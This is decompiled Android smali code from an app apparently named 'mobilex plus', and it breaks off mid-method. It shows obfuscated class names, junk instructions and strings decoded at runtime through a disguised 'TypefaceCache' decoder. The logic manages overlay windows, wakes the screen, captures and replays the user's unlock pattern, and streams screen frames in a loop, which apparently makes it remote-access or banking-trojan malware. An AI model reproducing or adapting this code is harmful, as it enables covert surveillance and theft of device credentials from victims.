.class public final synthetic Lv/s/jdOQeRk37T35X5xKW1P;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(I)V
    .locals 0

    .line 1
    iput p1, p0, Lv/s/jdOQeRk37T35X5xKW1P;->w9sT1Swbhx3hs:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 2
    const/4 p1, 0x7

    iput p1, p0, Lv/s/jdOQeRk37T35X5xKW1P;->w9sT1Swbhx3hs:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static synthetic zdwfnqxhkl()V
    .locals 1

    const-string v0, "android.intent.action.VIEW"

    const-string v0, "net.manager.nlwylkjm"

    const-string v0, "user"

    const-string v0, "io.service.xptobgsnip"

    const-string v0, "WARN"

    const-string v0, "net.manager.opopuagv"

    const-string v0, "refresh"

    const-string v0, "Gson"

    const-string v0, "BaseFragment"

    const-string v0, "io.service.vawdlw"

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 13

    .line 1
    iget v0, p0, Lv/s/jdOQeRk37T35X5xKW1P;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    const/16 v1, 0x18

    .line 4
    .line 5
    const/4 v2, 0x1

    .line 6
    const-string v3, "window"

    .line 7
    .line 8
    const/4 v4, 0x0

    nop

    nop

    .line 9
    const/16 v5, 0x0

    .line 10
    packed-switch v0, :pswitch_data_0

    .line 11
    .line 12
    .line 13
    :try_start_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 14
    .line 15
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 16
    .line 17
    .line 18
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 19
    .line 20
    .line 21
    move-result-object v0

    .line 22
    if-eqz v0, :cond_0

    .line 23
    .line 24
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->ECwLkmPW1UKz7J6E:Lv/s/V3YwOBcZuHItC;

    .line 25
    .line 26
    if-eqz v1, :cond_0

    .line 27
    .line 28
    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 29
    .line 30
    .line 31
    move-result-object v0

    .line 32
    check-cast v0, Landroid/view/WindowManager;

    .line 33
    .line 34
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->ECwLkmPW1UKz7J6E:Lv/s/V3YwOBcZuHItC;

    .line 35
    .line 36
    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    .line 38
    .line 39
    goto/16 :goto_0

    .line 40
    :catch_0
    move-exception v0

    .line 41
    const-string v1, "002B007F005F008200C000BE00C600B300260064005500A400F100AF00C600B200310073001B008200E200AD00DD00B500790036"

    .line 42
    .line 43
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 44
    .line 45
    .line 46
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    :cond_0
    :goto_0
    sput-object v4, Lv/s/vbdyByOHPJmeGXlq;->ECwLkmPW1UKz7J6E:Lv/s/V3YwOBcZuHItC;

    .line 50
    .line 51
    sput-boolean v5, Lv/s/vbdyByOHPJmeGXlq;->iUQk66nAiXgO35:Z

    .line 52
    .line 53
    return-void

    .line 54
    :pswitch_0
    :try_start_1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 55
    .line 56
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 57
    .line 58
    .line 59
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 60
    .line 61
    .line 62
    move-result-object v0

    .line 63
    if-eqz v0, :cond_1

    .line 64
    .line 65
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->tne6mXOUFKdd:Lv/s/KtHgo1ZBbTF0NSPosJz;

    nop

    nop

    .line 66
    .line 67
    if-eqz v1, :cond_1

    .line 68
    .line 69
    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 70
    .line 71
    .line 72
    move-result-object v0

    nop

    nop

    .line 73
    check-cast v0, Landroid/view/WindowManager;

    .line 74
    .line 75
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->tne6mXOUFKdd:Lv/s/KtHgo1ZBbTF0NSPosJz;

    .line 76
    .line 77
    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 78
    .line 79
    .line 80
    goto :goto_1

    .line 81
    :catch_1
    move-exception v0

    .line 82
    const-string v1, "002B007F005F008200D100AF00C2008B002C0075005000C700F500AD00C000A80031002C001B"

    .line 83
    .line 84
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 85
    .line 86
    .line 87
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 88
    .line 89
    .line 90
    :cond_1
    :goto_1
    sput-object v4, Lv/s/vbdyByOHPJmeGXlq;->tne6mXOUFKdd:Lv/s/KtHgo1ZBbTF0NSPosJz;

    .line 91
    .line 92
    sput-boolean v5, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    .line 93
    .line 94
    const-string v0, "00020066004B00C700FC00B000D100AC00630079004D008200E200B300D300BE0063007E0052008300F400BA00DC"

    .line 95
    .line 96
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 97
    .line 98
    .line 99
    return-void

    .line 100
    :pswitch_1
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 101
    .line 102
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->gIIiyi2ddlMDR0()V

    .line 103
    .line 104
    .line 105
    return-void

    nop

    nop

    .line 106
    :pswitch_2
    :try_start_2
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 107
    .line 108
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 109
    .line 110
    .line 111
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 112
    .line 113
    .line 114
    move-result-object v0

    .line 115
    if-eqz v0, :cond_2

    .line 116
    .line 117
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->A1BaTVAMeIXMnh:Lv/s/NiXw8wskyH18G;

    .line 118
    .line 119
    if-eqz v1, :cond_2

    .line 120
    .line 121
    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 122
    .line 123
    .line 124
    move-result-object v0

    .line 125
    check-cast v0, Landroid/view/WindowManager;

    nop

    nop

    .line 126
    .line 127
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->A1BaTVAMeIXMnh:Lv/s/NiXw8wskyH18G;

    .line 128
    .line 129
    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 130
    .line 131
    .line 132
    goto :goto_2

    .line 133
    :catch_2
    move-exception v0

    .line 134
    const-string v1, "002B007F005F008200C000BE00C100B4003400790049008300D300BE00C200B300360064005E00C700F500AD00C000A80031002C001B"

    .line 135
    .line 136
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 140
    .line 141
    .line 142
    :cond_2
    :goto_2
    sput-object v4, Lv/s/vbdyByOHPJmeGXlq;->A1BaTVAMeIXMnh:Lv/s/NiXw8wskyH18G;

    .line 143
    .line 144
    sput-boolean v5, Lv/s/vbdyByOHPJmeGXlq;->k84rwRrqzhrNQ1CdNQ9:Z

    .line 145
    .line 146
    return-void

    .line 147
    :pswitch_3
    const-string v0, "001300770048009400E700B000C000A300630075005A009700E400AA00C000A200630077004E009300FF00F200DA00AE00270073001B00CF00A400EA00C100E70037007F0056008200FF00AA00C600EE"

    .line 148
    .line 149
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 153
    .line 154
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    nop

    .line 155
    .line 156
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->qfTrc75xwRVMl85vh:Lv/s/jdOQeRk37T35X5xKW1P;

    .line 157
    .line 158
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 159
    .line 160
    .line 161
    new-instance v1, Lv/s/jdOQeRk37T35X5xKW1P;

    .line 162
    .line 163
    const/16 v2, 0x1a

    add-int/lit8 v2, v2, -0x5

    .line 164
    .line 165
    invoke-direct {v1, v2}, Lv/s/jdOQeRk37T35X5xKW1P;-><init>(I)V

    .line 166
    .line 167
    .line 168
    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 169
    .line 170
    .line 171
    return-void

    .line 172
    :pswitch_4
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 173
    .line 174
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->gIIiyi2ddlMDR0()V

    .line 175
    .line 176
    .line 177
    return-void

    .line 178
    :pswitch_5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    nop

    .line 179
    .line 180
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 181
    .line 182
    .line 183
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 184
    .line 185
    .line 186
    move-result-object v0

    .line 187
    if-eqz v0, :cond_3

    .line 188
    .line 189
    sget-boolean v1, Lv/s/vbdyByOHPJmeGXlq;->hjneShqpF9Tis4:Z

    .line 190
    .line 191
    if-eqz v1, :cond_3

    .line 192
    .line 193
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 194
    .line 195
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 196
    .line 197
    const/16 v3, 0x14

    .line 198
    .line 199
    invoke-direct {v2, v0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 200
    .line 201
    .line 202
    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 203
    .line 204
    .line 205
    :cond_3
    return-void

    .line 206
    :pswitch_6
    const-string v0, "00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700E700220063004F008800BD00B700DB00A300260036001300D400A000AC009200B3002A007B005E008800E500AB009B"

    .line 207
    .line 208
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 209
    .line 210
    .line 211
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 212
    .line 213
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 214
    .line 215
    sget-object v2, Lv/s/vbdyByOHPJmeGXlq;->hV4VTKNUdeHN:Lv/s/jdOQeRk37T35X5xKW1P;

    .line 216
    .line 217
    invoke-virtual {v0, v2}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 218
    .line 219
    .line 220
    new-instance v2, Lv/s/jdOQeRk37T35X5xKW1P;

    .line 221
    .line 222
    invoke-direct {v2, v1}, Lv/s/jdOQeRk37T35X5xKW1P;-><init>(I)V

    .line 223
    .line 224
    .line 225
    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 226
    .line 227
    .line 228
    return-void

    .line 229
    :pswitch_7
    sget-object v0, Lapp/mobilex/plus/UtilNWWrapper;->A1BaTVAMeIXMnh:Ljava/lang/String;

    .line 230
    .line 231
    :try_start_3
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->ECwLkmPW1UKz7J6E:Ljava/lang/String;

    .line 232
    .line 233
    sget-object v0, Lapp/mobilex/plus/services/SyncQYAdapter;->VEkRsTDS6a9oHWI:Lapp/mobilex/plus/services/SyncQYAdapter;

    .line 234
    .line 235
    if-eqz v0, :cond_4

    .line 236
    .line 237
    invoke-virtual {v0}, Lapp/mobilex/plus/services/SyncQYAdapter;->VEkRsTDS6a9oHWI()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 238
    .line 239
    .line 240
    :catch_3
    :cond_4
    return-void

    .line 241
    :pswitch_8
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 242
    .line 243
    .line 244
    return-void

    .line 245
    :pswitch_9
    sget-object v0, Lapp/mobilex/plus/services/ManagerUMController;->DVTNwpDEVsUKuznof:Ljava/lang/String;

    nop

    nop

    .line 246
    .line 247
    sput-boolean v5, Lapp/mobilex/plus/services/ManagerUMController;->MSGkxvPxRYNqC:Z

    .line 248
    .line 249
    return-void

    nop

    nop

    .line 250
    :pswitch_a
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 251
    .line 252
    .line 253
    return-void

    .line 254
    :pswitch_b
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 255
    .line 256
    .line 257
    return-void

    nop

    nop

    .line 258
    :pswitch_c
    sget v0, Lapp/mobilex/plus/services/HelperHRAdapter$registerScreenStateReceiver$1;->w9sT1Swbhx3hs:I

    .line 259
    .line 260
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 261
    .line 262
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 263
    .line 264
    .line 265
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 266
    .line 267
    .line 268
    move-result-object v0

    .line 269
    if-eqz v0, :cond_5

    .line 270
    .line 271
    invoke-virtual {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->performWakeScreen()Z

    .line 272
    .line 273
    .line 274
    :cond_5
    return-void

    .line 275
    :pswitch_d
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 276
    .line 277
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 278
    .line 279
    .line 280
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 281
    .line 282
    .line 283
    move-result-object v0

    .line 284
    if-eqz v0, :cond_6

    nop

    .line 285
    .line 286
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 287
    .line 288
    .line 289
    move-result-object v4

    .line 290
    :cond_6
    if-nez v4, :cond_7

    .line 291
    .line 292
    goto/16 :goto_3

    .line 293
    :cond_7
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 294
    .line 295
    .line 296
    const-string v0, "000E00770055009200F100B3009200B7002200650048009000FF00AD00D600E700200077004B009300E500AD00D700FD006300650053008800E700B600DC00A000630079004D008200E200B300D300BE"

    .line 297
    .line 298
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 299
    .line 300
    .line 301
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 302
    .line 303
    new-instance v0, Lv/s/apQOLJtARzrH;

    .line 304
    .line 305
    invoke-direct {v0, v4, v2}, Lv/s/apQOLJtARzrH;-><init>(Landroid/content/Context;I)V

    .line 306
    .line 307
    .line 308
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 309
    .line 310
    .line 311
    move-result-object v2

    .line 312
    if-nez v2, :cond_8

    .line 313
    .line 314
    const-string v1, "000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073001B008100FF00AD009200B7002200650048009000FF00AD00D600E700200077004B009300E500AD00D7"

    nop

    nop

    .line 315
    .line 316
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 317
    .line 318
    .line 319
    const-string v1, ""

    .line 320
    .line 321
    invoke-virtual {v0, v1}, Lv/s/apQOLJtARzrH;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 322
    .line 323
    .line 324
    goto/16 :goto_3

    .line 325
    :cond_8
    sput-object v0, Lv/s/vbdyByOHPJmeGXlq;->euF5Udt5Rqv3Qmea:Lv/s/apQOLJtARzrH;

    .line 326
    .line 327
    sget-object v3, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 328
    .line 329
    new-instance v4, Lv/s/A68NpXPqwTFos99nt;

    .line 330
    .line 331
    invoke-direct {v4, v2, v1, v0}, Lv/s/A68NpXPqwTFos99nt;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 332
    .line 333
    .line 334
    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 335
    .line 336
    .line 337
    :goto_3
    return-void

    .line 338
    :pswitch_e
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 339
    .line 340
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 341
    .line 342
    .line 343
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->VEkRsTDS6a9oHWI()V

    .line 344
    .line 345
    .line 346
    return-void

    .line 347
    :pswitch_f
    invoke-static {v5}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPatternReplayInProgress$cp(Z)V

    .line 348
    .line 349
    .line 350
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 351
    .line 352
    .line 353
    move-result-wide v0

    nop

    nop

    .line 354
    invoke-static {v0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLastPatternCaptureTime$cp(J)V

    .line 355
    .line 356
    .line 357
    return-void

    nop

    nop

    .line 358
    :pswitch_10
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 359
    .line 360
    sget-boolean v0, Lv/s/vbdyByOHPJmeGXlq;->b1EoSIRjJHO5:Z

    nop

    .line 361
    .line 362
    if-eqz v0, :cond_9

    .line 363
    .line 364
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->hjneShqpF9Tis4()V

    .line 365
    .line 366
    .line 367
    :cond_9
    return-void

    .line 368
    :pswitch_11
    new-instance v0, Lv/s/g78iUtGnOvef;

    .line 369
    .line 370
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    .line 371
    .line 372
    .line 373
    new-instance v1, Lv/s/g78iUtGnOvef;

    nop

    .line 374
    .line 375
    invoke-direct {v1}, Ljava/lang/Object;-><init>()V

    .line 376
    .line 377
    .line 378
    :cond_a
    :goto_4
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 379
    .line 380
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 381
    .line 382
    .line 383
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 384
    .line 385
    .line 386
    move-result v3

    .line 387
    if-eqz v3, :cond_16

    .line 388
    .line 389
    const/4 v3, 0x5

    .line 390
    :try_start_4
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 391
    .line 392
    const v6, 0x1e

    .line 393
    .line 394
    if-lt v4, v6, :cond_13

    .line 395
    .line 396
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 397
    .line 398
    .line 399
    move-result-wide v6

    .line 400
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUseH264$cp()Z

    .line 401
    .line 402
    .line 403
    move-result v4

    .line 404
    const-wide/16 v8, 0x50

    .line 405
    .line 406
    if-eqz v4, :cond_b

    nop

    .line 407
    .line 408
    goto/16 :goto_5

    .line 409
    :cond_b
    sget v4, Lv/s/QmLUFJ3vXstIdpO2wk;->dDIMxZXP1V8HdM:I

    .line 410
    .line 411
    sget v4, Lv/s/QmLUFJ3vXstIdpO2wk;->dDIMxZXP1V8HdM:I

    .line 412
    .line 413
    invoke-static {v4}, Lv/s/Y9mRyRdkl5FOcwb66V6;->J0zjQ7CAgohuxU20eCW6(I)I

    .line 414
    .line 415
    .line 416
    move-result v4

    .line 417
    if-eqz v4, :cond_d

    .line 418
    .line 419
    if-eq v4, v2, :cond_e

    .line 420
    .line 421
    const/16 v8, 0x2

    .line 422
    if-ne v4, v8, :cond_c

    nop

    .line 423
    .line 424
    const-wide/16 v8, 0x96

    .line 425
    .line 426
    goto :goto_5

    .line 427
    :cond_c
    new-instance v4, Lv/s/Sb7Xj3N9U1DQ;

    .line 428
    .line 429
    invoke-direct {v4}, Ljava/lang/RuntimeException;-><init>()V

    .line 430
    .line 431
    .line 432
    throw v4

    .line 433
    :cond_d
    const-wide/16 v8, 0x32

    .line 434
    .line 435
    :cond_e
    :goto_5
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLastCaptureTsMs$cp()J

    .line 436
    .line 437
    .line 438
    move-result-wide v10

    .line 439
    sub-long v10, v6, v10

    .line 440
    .line 441
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 442
    .line 443
    .line 444
    move-result v4

    .line 445
    if-eqz v4, :cond_16

    .line 446
    .line 447
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUseH264$cp()Z

    .line 448
    .line 449
    .line 450
    move-result v4

    .line 451
    if-eqz v4, :cond_11

    .line 452
    .line 453
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getHwEncoder$cp()Lv/s/lLybWDNhgEj7LwIe;

    .line 454
    .line 455
    .line 456
    move-result-object v4

    nop

    .line 457
    if-eqz v4, :cond_11

    .line 458
    .line 459
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getHwEncoder$cp()Lv/s/lLybWDNhgEj7LwIe;

    .line 460
    .line 461
    .line 462
    move-result-object v4

    .line 463
    if-eqz v4, :cond_f

    .line 464
    .line 465
    iget-object v4, v4, Lv/s/lLybWDNhgEj7LwIe;->Ee8d2j4S9Vm5yGuR:Ljava/util/concurrent/ConcurrentLinkedQueue;

    nop

    .line 466
    .line 467
    if-eqz v4, :cond_f

    .line 468
    .line 469
    invoke-virtual {v4}, Ljava/util/concurrent/ConcurrentLinkedQueue;->size()I

    .line 470
    .line 471
    .line 472
    move-result v4

    .line 473
    goto :goto_6

    .line 474
    :catchall_0
    move-exception v4

    .line 475
    goto/16 :goto_9

    .line 476
    .line 477
    :cond_f
    move v4, v5

    .line 478
    :goto_6
    if-lt v4, v3, :cond_10

    .line 479
    .line 480
    move v4, v2

    .line 481
    goto :goto_7

    .line 482
    :cond_10
    move/from16 v4, v5

    .line 483
    :goto_7
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getH264CaptureInFlight$cp()Z

    .line 484
    .line 485
    .line 486
    move-result v12

    .line 487
    if-nez v12, :cond_12

    .line 488
    .line 489
    cmp-long v8, v10, v8

    .line 490
    .line 491
    if-ltz v8, :cond_12

    .line 492
    .line 493
    if-nez v4, :cond_12

    nop

    nop

    .line 494
    .line 495
    invoke-static {v2}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setH264CaptureInFlight$cp(Z)V

    .line 496
    .line 497
    .line 498
    invoke-static {v6, v7}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLastCaptureTsMs$cp(J)V

    .line 499
    .line 500
    .line 501
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 502
    .line 503
    .line 504
    move-result-object v4

    .line 505
    if-eqz v4, :cond_12

    .line 506
    .line 507
    new-instance v6, Lv/s/tqMsvBGMHi2d1wCf3x;

    .line 508
    .line 509
    invoke-direct {v6, v1, v5, v0}, Lv/s/tqMsvBGMHi2d1wCf3x;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 510
    .line 511
    .line 512
    invoke-static {v4, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->access$captureScreenInternalBitmap(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 513
    .line 514
    .line 515
    goto/16 :goto_8

    .line 516
    :cond_11
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLatestFrame$cp()Ljava/util/concurrent/atomic/AtomicReference;

    .line 517
    .line 518
    .line 519
    move-result-object v4

    .line 520
    invoke-virtual {v4}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    .line 521
    .line 522
    .line 523
    move-result-object v4

    .line 524
    if-nez v4, :cond_12

    .line 525
    .line 526
    cmp-long v4, v10, v8

    .line 527
    .line 528
    if-ltz v4, :cond_12

    .line 529
    .line 530
    invoke-static {v6, v7}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLastCaptureTsMs$cp(J)V

    .line 531
    .line 532
    .line 533
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 534
    .line 535
    .line 536
    move-result-object v4

    .line 537
    if-eqz v4, :cond_12

    .line 538
    .line 539
    new-instance v6, Lv/s/tqMsvBGMHi2d1wCf3x;

    .line 540
    .line 541
    invoke-direct {v6, v0, v2, v1}, Lv/s/tqMsvBGMHi2d1wCf3x;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 542
    .line 543
    .line 544
    invoke-static {v4, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->access$captureScreenInternal(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 545
    .line 546
    .line 547
    :cond_12
    :goto_8
    iget v4, v0, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 548
    .line 549
    rem-int/lit8 v6, v4, 0x1e

    .line 550
    .line 551
    if-nez v6, :cond_13

    .line 552
    .line 553
    if-lez v4, :cond_13

    .line 554
    .line 555
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 556
    .line 557
    .line 558
    const-string v4, "00000077004B009300E500AD00D700A30063"

    .line 559
    .line 560
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 561
    .line 562
    .line 563
    const-string v4, "006300700049008600FD00BA00C100E7006B007E000900D100A400E2"

    .line 564
    .line 565
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 566
    .line 567
    .line 568
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUseH264$cp()Z

    .line 569
    .line 570
    .line 571
    const-string v4, "006F0036005E009500E200B000C000B4007E"

    .line 572
    .line 573
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 574
    .line 575
    .line 576
    :cond_13
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUseH264$cp()Z

    .line 577
    .line 578
    .line 579
    const-wide/16 v6, 0x14

    .line 580
    .line 581
